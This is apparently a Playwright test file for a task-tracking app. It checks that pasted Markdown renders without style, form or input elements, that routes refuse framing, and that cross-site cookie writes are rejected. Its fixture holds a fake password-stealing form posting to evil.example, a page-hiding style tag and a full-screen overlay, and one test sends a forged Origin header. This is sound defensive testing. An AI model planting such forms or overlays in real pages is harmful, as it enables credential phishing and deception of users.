import { expect, test, type Locator, type Page } from "@playwright/test";
import { createProject, register, unique } from "./helpers";

/*
 * Text an agent copied in from anywhere stays text: no stylesheet, no style
 * attribute and no form reaches the page, wherever Markdown is drawn. And
 * nobody can frame the app, or write to it from another site with the
 * cookie of somebody signed in.
 */

const HOSTILE = [
  "Plain words stay.",
  "",
  "<style>body { display: none !important; }</style>",
  '<form action="https://evil.example/steal"><input name="password"><button>Sign in</button><select><option>a</option></select><textarea>x</textarea></form>',
  "",
  '<p style="position:fixed;inset:0;background:red">covered</p>',
  "",
  "- [x] shipped box",
  "- [ ] open box",
].join("\n");

const FORBIDDEN = "style, form, input, button, textarea, select, option, [style]";

/** The Markdown drew the words and none of the hostile parts. */
async function drawnAsText(page: Page, box: Locator) {
  await expect(box).toContainText("Plain words stay.");
  await expect(box).toContainText("covered");
  await expect(box.locator(FORBIDDEN)).toHaveCount(0);
  // GFM task boxes still draw, as spans.
  await expect(box.locator('[data-task-box][aria-checked="true"]')).toHaveCount(1);
  await expect(box.locator('[data-task-box][aria-checked="false"]')).toHaveCount(1);
  expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe("none");
}

function freshKey(): string {
  return `H${Math.random().toString(36).slice(2, 7).toUpperCase()}`;
}

test.describe("Hostile text", () => {
  test("draws no style or form in a description, a comment and a release note", async ({
    page,
    browser,
  }, testInfo) => {
    await register(page, "Careful Person");
    const projectId = await createProject(page, unique("Hostile"));
    const key = freshKey();
    const as = page.request;
    expect((await as.patch(`/api/projects/${projectId}`, { data: { key } })).ok()).toBe(true);

    const made = await as.post(`/api/projects/${projectId}/tasks`, {
      data: { title: "Pasted from a stranger", description: HOSTILE },
    });
    expect(made.ok()).toBe(true);
    const task = ((await made.json()) as { task: { id: string; key: string } }).task;
    expect(
      (await as.post(`/api/tasks/${task.id}/comments`, { data: { body: HOSTILE } })).ok(),
    ).toBe(true);

    await page.goto(`/p/${projectId}?task=${task.key}`);
    await drawnAsText(page, page.getByTestId("markdown").first());
    await drawnAsText(page, page.getByTestId("comment-markdown"));
    await page.screenshot({ path: testInfo.outputPath("seen-hostile-panel.png") });

    // A shipped release with the same note, in the app and on the public page.
    const property = await as.post(`/api/projects/${projectId}/properties`, {
      data: { name: "Version", type: "select", options: ["v1"] },
    });
    expect(property.ok()).toBe(true);
    const board = await (await as.get(`/api/projects/${projectId}/board`)).json();
    const version = (
      board.properties as { id: string; name: string; options: { id: string }[] }[]
    ).find((p) => p.name === "Version")!;
    expect((await as.patch(`/api/properties/${version.id}`, { data: { dated: true } })).ok()).toBe(
      true,
    );
    expect((await as.post(`/api/projects/${projectId}/releases`)).ok()).toBe(true);
    expect(
      (
        await as.patch(`/api/options/${version.options[0].id}`, {
          data: { shippedAt: "2026-09-01", note: HOSTILE },
        })
      ).ok(),
    ).toBe(true);
    expect(
      (await as.patch(`/api/projects/${projectId}`, { data: { publicChangelog: true } })).ok(),
    ).toBe(true);

    await page.goto(`/p/${projectId}/changelog`);
    await drawnAsText(page, page.getByTestId("changelog-note"));

    const stranger = await (await browser.newContext()).newPage();
    expect((await stranger.goto(`/changelog/${key.toLowerCase()}`))?.ok()).toBe(true);
    await drawnAsText(stranger, stranger.getByTestId("changelog-note"));
    await stranger.screenshot({ path: testInfo.outputPath("seen-hostile-changelog.png") });
  });

  test("every page and route refuses a frame", async ({ request }) => {
    for (const path of ["/login", "/", "/api/health", "/changelog/nothing-here"]) {
      const res = await request.get(path, { maxRedirects: 0 });
      expect(res.headers()["content-security-policy"], path).toBe("frame-ancestors 'none'");
      expect(res.headers()["x-frame-options"], path).toBe("DENY");
    }
  });

  test("a cookie write from another site answers 403; a token write with no Origin passes", async ({
    page,
    request,
  }) => {
    await register(page, "Signed In");
    const projectId = await createProject(page, unique("Origin"));
    const as = page.request;

    const forged = await as.post(`/api/projects/${projectId}/tasks`, {
      data: { title: "Forged" },
      headers: { Origin: "https://evil.example" },
    });
    expect(forged.status()).toBe(403);
    const sibling = await as.post(`/api/projects/${projectId}/tasks`, {
      data: { title: "Forged" },
      headers: { Origin: "https://blog.not-this-host.example" },
    });
    expect(sibling.status()).toBe(403);

    const here = new URL(page.url()).origin;
    const own = await as.post(`/api/projects/${projectId}/tasks`, {
      data: { title: "Mine" },
      headers: { Origin: here },
    });
    expect(own.ok()).toBe(true);

    const agent = await as.post(`/api/projects/${projectId}/agents`, { data: { name: "Reis" } });
    const agentId = ((await agent.json()) as { agent: { id: string } }).agent.id;
    const issued = await as.post(`/api/projects/${projectId}/agents/${agentId}/tokens`, {
      data: { name: "script" },
    });
    const secret = ((await issued.json()) as { secret: string }).secret;
    // `request` carries no cookie and sends no Origin, as a script does.
    const scripted = await request.post(`/api/projects/${projectId}/tasks`, {
      data: { title: "From a script" },
      headers: { Authorization: `Bearer ${secret}` },
    });
    expect(scripted.ok()).toBe(true);
  });
});
